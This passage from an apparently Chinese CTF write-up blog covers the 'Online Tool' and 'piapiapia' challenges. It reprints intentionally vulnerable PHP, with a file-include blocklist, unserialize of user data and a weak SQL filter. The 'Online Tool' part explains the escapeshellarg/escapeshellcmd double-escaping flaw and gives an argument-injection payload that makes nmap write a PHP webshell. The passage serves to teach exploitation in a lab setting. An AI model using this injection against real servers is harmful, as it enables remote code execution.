class=\"line\">error_reporting(0);</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class=\"line\">\texit(&apos;hacker!&apos;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if($file)&#123;</span><br><span class=\"line\">\tinclude($file);</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\techo &apos;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&apos;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>哦，然后直接读 <code>flag.php</code></p>\n<h3 id=\"Online-Tool\"><a href=\"#Online-Tool\" class=\"headerlink\" title=\"Online Tool\"></a>Online Tool</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_SERVER[<span class=\"string\">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class=\"line\">    $_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>] = $_SERVER[<span class=\"string\">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'host'</span>])) &#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    $host = $_GET[<span class=\"string\">'host'</span>];</span><br><span class=\"line\">    $host = escapeshellarg($host);</span><br><span class=\"line\">    $host = escapeshellcmd($host);</span><br><span class=\"line\">    $sandbox = md5(<span class=\"string\">\"glzjin\"</span>. $_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'you are in sandbox '</span>.$sandbox;</span><br><span class=\"line\">    @mkdir($sandbox);</span><br><span class=\"line\">    chdir($sandbox);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> system(<span class=\"string\">\"nmap -T5 -sT -Pn --host-timeout 2 -F \"</span>.$host);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>百度到文章</p>\n<p>我们编写示例代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$param = <span class=\"string\">\"127.0.0.1' -v -d a=1\"</span>;</span><br><span class=\"line\">$ep = escapeshellarg($param);</span><br><span class=\"line\">$eep = escapeshellcmd($ep);</span><br><span class=\"line\">$cmd = <span class=\"string\">\"curl \"</span>.$eep;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $ep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $eep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $cmd.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">system($cmd);</span><br><span class=\"line\"></span><br><span class=\"line\">输出结果：</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'127.0.0.1'</span>\\<span class=\"string\">''</span> -v -d a=<span class=\"number\">1</span><span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">'</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"string\">'\\\\'</span><span class=\"string\">' -v -d a=1\\'</span></span><br><span class=\"line\"><span class=\"string\">curl '</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"string\">'\\\\'</span><span class=\"string\">' -v -d a=1\\'</span></span><br><span class=\"line\"><span class=\"string\">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class=\"line\"><span class=\"string\">                                 Dload  Upload   Total   Spent    Left  Speed</span></span><br><span class=\"line\"><span class=\"string\">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: 127.0.0.1\\</span></span><br><span class=\"line\"><span class=\"string\">* Closing connection 0</span></span><br></pre></td></tr></table></figure>\n\n<p>可以看到我们输入 <code>127.0.0.1&#39; -v -d a=1</code> 后，经过 <code>escapeshellarg()</code> 转义变成<code>&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1&#39;</code> 。</p>\n<p> <code>&#39;</code> 被转义为 <code>\\&#39;</code> ,被隔开的两部分分别左右两端加上一对 <code>&#39;&#39;</code> 然后连接在一起；</p>\n<p> 然后经过 <code>escapeshelcmd()</code> 后，变成了 <code>&#39;127.0.0.1&#39;\\\\&#39;&#39; -v -d a=1\\&#39;</code>, 可以看到上一步留下的 <code>\\</code> 再次被转义成 <code>\\\\</code> ，这时就只表示 <code>\\</code> ，不起转义作用，于是 <code>127.0.0.1</code> 单独成组，紧跟 <code>\\</code> ，后面两个单引号单独成组 <code>&#39;&#39;</code> ，只剩下结尾的一个 <code>&#39;</code> 被转义 <code>\\&#39;</code> </p>\n<p>最后执行的命令就变成了 <code>curl &#39;127.0.0.1&#39;\\ -v -d a=1&#39;</code> , 请求的是 <code>127.0.0.1\\</code> , POST的数据是 <code>a=1&#39;</code> .</p>\n<p>回到题目可以看到使用的是 <code>&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host</code>  ,而通过查看 nmap 手册发现输出命令，我们试一下</p>\n<p><code>nmap 127.0.0.1 -oN 1.php</code> </p>\n<p>查看 1.php 内容</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Nmap 7.70 scan initiated Thu Apr 23 19:48:07 2020 as: nmap -oN 1.php 127.0.0.1</span></span><br><span class=\"line\">Nmap scan report for localhost (127.0.0.1)</span><br><span class=\"line\">Host is up (0.0000060s latency).</span><br><span class=\"line\">Not shown: 998 closed ports</span><br><span class=\"line\">PORT    STATE SERVICE</span><br><span class=\"line\">80/tcp  open  http</span><br><span class=\"line\">111/tcp open  rpcbind</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Nmap <span class=\"keyword\">done</span> at Thu Apr 23 19:48:08 2020 -- 1 IP address (1 host up) scanned <span class=\"keyword\">in</span> 0.51 seconds</span></span><br></pre></td></tr></table></figure>\n\n<p>有了上面的知识后，剩下的就是想办法绕过题目的限制</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">example.php</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$param1 = <span class=\"string\">\" ' &lt;?php echo `ls`;?&gt; -oN 1.php ' \"</span>;</span><br><span class=\"line\">$ep = escapeshellarg($param1);</span><br><span class=\"line\">$eep = escapeshellcmd($ep);</span><br><span class=\"line\">$cmd = <span class=\"string\">\"nmap \"</span>.$eep;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $ep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $eep.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $cmd.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">system($cmd);</span><br><span class=\"line\"></span><br><span class=\"line\">输出：</span><br><span class=\"line\"> <span class=\"string\">' &lt;?php echo `ls`;?&gt; -oN 1.php '</span> </span><br><span class=\"line\"><span class=\"string\">' '</span>\\<span class=\"string\">''</span> <span class=\"meta\">&lt;?php</span> <span class=\"keyword\">echo</span> `ls`;<span class=\"meta\">?&gt;</span> -oN <span class=\"number\">1.</span>php <span class=\"string\">'\\''</span> <span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">'</span> <span class=\"string\">'\\\\'</span><span class=\"string\">' \\&lt;\\?php echo \\`ls\\`\\;\\?\\&gt; -oN 1.php '</span>\\\\<span class=\"string\">''</span> <span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">nmap '</span> <span class=\"string\">'\\\\'</span><span class=\"string\">' \\&lt;\\?php echo \\`ls\\`\\;\\?\\&gt; -oN 1.php '</span>\\\\<span class=\"string\">''</span> <span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-23 20:06 CST</span></span><br></pre></td></tr></table></figure>\n\n<p>查看 1.php 可以看到执行的命令是</p>\n<p><code>nmap -oN 1.php \\ &lt;?php echo</code>ls<code>;?&gt; \\\\</code></p>\n<p> 我们传入参数 <code>&#39; &lt;?php echo &#39;ls&#39;;?&gt; -oN 1.php &#39;</code>  , 加的单引号目的是为了通过单引号闭合转义加上的单引号。</p>\n<p>需要注意的是参数后面的单引号需要隔一个空格，不然生成的文件名就会是 <code>.php\\\\</code> ,不能被正常解析了。 随机我们运行 1.php ,可以看到成功解析了。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:~/桌面# php 1.php</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Nmap 7.70 scan initiated Sat Apr 25 11:16:03 2020 as: nmap -oN 1.php \\ 1.php</span></span><br><span class=\"line\">1.php\\\\ </span><br><span class=\"line\">1.txt</span><br><span class=\"line\">ctf</span><br><span class=\"line\">dc-2.txt</span><br><span class=\"line\">escapeshellarg.php</span><br><span class=\"line\">index.php~</span><br><span class=\"line\">pickle1.py</span><br><span class=\"line\">shell-7.x-1.0-beta5.zip</span><br><span class=\"line\">shell.py</span><br><span class=\"line\">snippet.py</span><br><span class=\"line\">test.php</span><br><span class=\"line\">th.jpeg</span><br><span class=\"line\">top6000.txt</span><br><span class=\"line\"> \\\\</span><br><span class=\"line\">Failed to resolve \"\\\".</span><br><span class=\"line\">Failed to resolve \"&lt;?php\".</span><br></pre></td></tr></table></figure>\n\n<p>对于本题，可以传入</p>\n<p><code>&#39; &lt;?php echo &#39;ls&#39;;?&gt; -oN 1.php  &#39;</code></p>\n<h3 id=\"piapiapia\"><a href=\"#piapiapia\" class=\"headerlink\" title=\"piapiapia\"></a>piapiapia</h3><p>扫描目录得到源码</p>\n<p>class.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require</span>(<span class=\"string\">'config.php'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">user</span> <span class=\"keyword\">extends</span> <span class=\"title\">mysql</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> $table = <span class=\"string\">'users'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">is_exists</span><span class=\"params\">($username)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::select(<span class=\"keyword\">$this</span>-&gt;table, $where);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">register</span><span class=\"params\">($username, $password)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">\t\t$password = <span class=\"keyword\">parent</span>::filter($password);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$key_list = <span class=\"keyword\">Array</span>(<span class=\"string\">'username'</span>, <span class=\"string\">'password'</span>);</span><br><span class=\"line\">\t\t$value_list = <span class=\"keyword\">Array</span>($username, md5($password));</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::insert(<span class=\"keyword\">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span><span class=\"params\">($username, $password)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">\t\t$password = <span class=\"keyword\">parent</span>::filter($password);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t$object = <span class=\"keyword\">parent</span>::select(<span class=\"keyword\">$this</span>-&gt;table, $where);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show_profile</span><span class=\"params\">($username)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t$object = <span class=\"keyword\">parent</span>::select(<span class=\"keyword\">$this</span>-&gt;table, $where);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> $object-&gt;profile;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update_profile</span><span class=\"params\">($username, $new_profile)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">\t\t$new_profile = <span class=\"keyword\">parent</span>::filter($new_profile);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::update(<span class=\"keyword\">$this</span>-&gt;table, <span class=\"string\">'profile'</span>, $new_profile, $where);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">__class__</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">mysql</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> $link = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">connect</span><span class=\"params\">($config)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">$this</span>-&gt;link = mysql_connect(</span><br><span class=\"line\">\t\t\t$config[<span class=\"string\">'hostname'</span>],</span><br><span class=\"line\">\t\t\t$config[<span class=\"string\">'username'</span>], </span><br><span class=\"line\">\t\t\t$config[<span class=\"string\">'password'</span>]</span><br><span class=\"line\">\t\t);</span><br><span class=\"line\">\t\tmysql_select_db($config[<span class=\"string\">'database'</span>]);</span><br><span class=\"line\">\t\tmysql_query(<span class=\"string\">\"SET sql_mode='strict_all_tables'\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;link;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">select</span><span class=\"params\">($table, $where, $ret = <span class=\"string\">'*'</span>)</span> </span>&#123;</span><br><span class=\"line\">\t\t$sql = <span class=\"string\">\"SELECT $ret FROM $table WHERE $where\"</span>;</span><br><span class=\"line\">\t\t$result = mysql_query($sql, <span class=\"keyword\">$this</span>-&gt;link);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> mysql_fetch_object($result);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">insert</span><span class=\"params\">($table, $key_list, $value_list)</span> </span>&#123;</span><br><span class=\"line\">\t\t$key = implode(<span class=\"string\">','</span>, $key_list);</span><br><span class=\"line\">\t\t$value = <span class=\"string\">'\\''</span> . implode(<span class=\"string\">'\\',\\''</span>, $value_list) . <span class=\"string\">'\\''</span>; </span><br><span class=\"line\">\t\t$sql = <span class=\"string\">\"INSERT INTO $table ($key) VALUES ($value)\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> mysql_query($sql);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span><span class=\"params\">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class=\"line\">\t\t$sql = <span class=\"string\">\"UPDATE $table SET $key = '$value' WHERE $where\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> mysql_query($sql);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($string)</span> </span>&#123;</span><br><span class=\"line\">\t\t$escape = <span class=\"keyword\">array</span>(<span class=\"string\">'\\''</span>, <span class=\"string\">'\\\\\\\\'</span>);</span><br><span class=\"line\">\t\t$escape = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $escape) . <span class=\"string\">'/'</span>; <span class=\"comment\">// \\|\\\\\\\\</span></span><br><span class=\"line\">\t\t$string = preg_replace($escape, <span class=\"string\">'_'</span>, $string);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$safe = <span class=\"keyword\">array</span>(<span class=\"string\">'select'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'update'</span>, <span class=\"string\">'delete'</span>, <span class=\"string\">'where'</span>);</span><br><span class=\"line\">\t\t$safe = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $safe) . <span class=\"string\">'/i'</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> preg_replace($safe, <span class=\"string\">'hacker'</span>, $string);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">__class__</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">$user = <span class=\"keyword\">new</span> user();</span><br><span class=\"line\">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure>\n\n<p>config.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t$config[<span class=\"string\">'hostname'</span>] = <span class=\"string\">'127.0.0.1'</span>;</span><br><span class=\"line\">\t$config[<span class=\"string\">'username'</span>] = <span class=\"string\">'root'</span>;</span><br><span class=\"line\">\t$config[<span class=\"string\">'password'</span>] = <span class=\"string\">''</span>;</span><br><span class=\"line\">\t$config[<span class=\"string\">'database'</span>] = <span class=\"string\">''</span>;</span><br><span class=\"line\">\t$flag = <span class=\"string\">''</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>profile.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\trequire_once(&apos;class.php&apos;);</span><br><span class=\"line\">\tif($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class=\"line\">\t\tdie(&apos;Login First&apos;);\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t$username = $_SESSION[&apos;username&apos;];</span><br><span class=\"line\">\t$profile=$user-&gt;show_profile($username);</span><br><span class=\"line\">\tif($profile  == null) &#123;</span><br><span class=\"line\">\t\theader(&apos;Location: update.php&apos;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse &#123;</span><br><span class=\"line\">\t\t$profile = unserialize($profile);</span><br><span class=\"line\">\t\t$phone = $profile[&apos;phone&apos;];</span><br><span class=\"line\">\t\t$email = $profile[&apos;email&apos;];</span><br><span class=\"line\">\t\t$nickname = $profile[&apos;nickname&apos;];</span><br><span class=\"line\">\t\t$photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class=\"line\">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">\t&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class=\"line\">\t\t&lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class=\"line\">\t\t&lt;h3&gt;Hi &lt;?php echo $nickname;?&gt;&lt;/h3&gt;</span><br><span class=\"line\">\t\t&lt;label&gt;Phone: &lt;?php echo $phone;?&gt;&lt;/label&gt;</span><br><span class=\"line\">\t\t&lt;label&gt;Email: &lt;?php echo $email;?&gt;&lt;/label&gt;</span><br><span class=\"line\">\t&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">\t&#125;</span><br><span 